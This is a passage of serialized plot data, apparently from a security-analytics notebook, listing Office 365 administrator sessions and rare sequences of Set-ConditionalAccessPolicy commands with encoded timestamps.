(Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"timvic@contoso.onmicrosoft.com\"],\"begin\":{\"__ndarray__\":\"AADjw0std0IAAG/EVS13QgAACZydLXdCAAA2050td0IAgPEgpi13QgAAukLwLXdCAACTyPotd0IAgP3nQC53QgCA4T9BLndCAABjW0wud0IAAEsmlC53QgAAC27rLndCAABrmfYud0IAgOMbOi93QgCAJ2Q6L3dCAIAG9UIvd0IAgMLqiy93QgAAvzaWL3dCAICsgpYvd0IAgOzx3C93QgAASpzmL3dCAICc7OYvd0IAgOHgLzB3QgAAUiwwMHdCAICKbjowd0IAAK9pgTB3QgCAaiKNMHdCAIAW99Qwd0IAAC9u3jB3QgCA8KUoMXdCAIAx8TIxd0IAgJRveTF3QgCAMYKDMXdCAIDxI8wxd0IAAHFv1jF3QgCAdRwdMndCAAA93yYyd0IAAMwacDJ3QgAAL8LEMndCAACUE80yd0IAgGtxFzN3QgCAQmVqM3dCAICN3nMzd0IAAGpiuzN3QgAABpDEM3dCAABu0sQzd0IAgP07DzR3QgAA86MYNHdCAICZoWI0d0IAANlWazR3QgAAaqdrNHdCAACdG7U0d0IAAFI2vTR3QgAA6q4GNXdCAAAMnQ81d0IAAMTsVzV3QgCAwERgNXdCAICRtGA1d0IAgNlvqDV3QgCAhqmyNXdCAIBr7LI1d0IAgJp4BjZ3QgCAl7lZNndCAACt9aA2d0IAgBLgrTZ3QgAAEoXyNndCAID9Qfw2d0IAgIQrRTd3QgAALYVPN3dCAIBY4Zc3d0IAgDclmDd3QgAAyQKfN3dCAIC5eqI3d0IAgLom6zd3QgCA/GjzN3dCAAD87zw4d0IAACwjSDh3QgAA/PGPOHdCAIAeSpA4d0IAgB6RmTh3QgCA6OPgOHdCAIDAfus4d0IAgGoAMzl3QgCA2Hw+OXdCAIDhuT45d0IAgKICPzl3QgAAO0qEOXdCAIC4bIc5d0IAAINzkDl3QgCAWpmQOXdCAIAzpdg5d0IAAOap4jl3QgAAuS0sOndCAICydyw6d0IAAIcvNDp3QgCAR/99OndCAIA6V4g6d0IAgO+hiDp3QgCAKY/POndCAIBrv9o6d0IAAPCqITt3QgAAh/ohO3dCAAD6kCw7d0IAgG3tcjt3QgCA8BuAO3dCAAD6Wcc7d0IAAEtP0Tt3QgCA9MnSO3dCAAC/U9s7d0IAgL2A+Dt3QgCA9mwZPHdCAICKvyM8d0IAgBDfKDx3QgAAF3ctPHdCAIC+qFY8d0IAgF6sWDx3QgAA9KxgPHdCAADnb248d0IAgIBGbzx3QgCAFv52PHdCAIB3pr08d0IAACb/xzx3QgCACN7WPHdCAABU7g49d0IAAMlUGj13QgAAKJhjPXdCAICoUW09d0IAgAqVbT13QgCAMJ23PXdCAADVXL89d0IAgN4dBj53QgAAubYSPndCAAAe+Vs+d0IAAKkUZT53QgCARfasPndCAIBDW7g+d0IAAI1JUD93QgCAFOdaP3dCAAAAp6I/d0IAgLzNrT93QgAAkIv2P3dCAAC3w/Y/d0IAAECGAEB3QgAAyjBJQHdCAAAUMFVAd0IAgNk3wzl3Qg==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[146]},\"color\":[\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\"],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145],\"rarest_window3\":[[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/21/2020 2:26:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/21/2020 2:26:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/21/2020 5:24:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '6/21/2020 5:24:55 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:59 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:59 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/22/2020 4:47:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/22/2020 4:47:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/23/2020 2:22:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 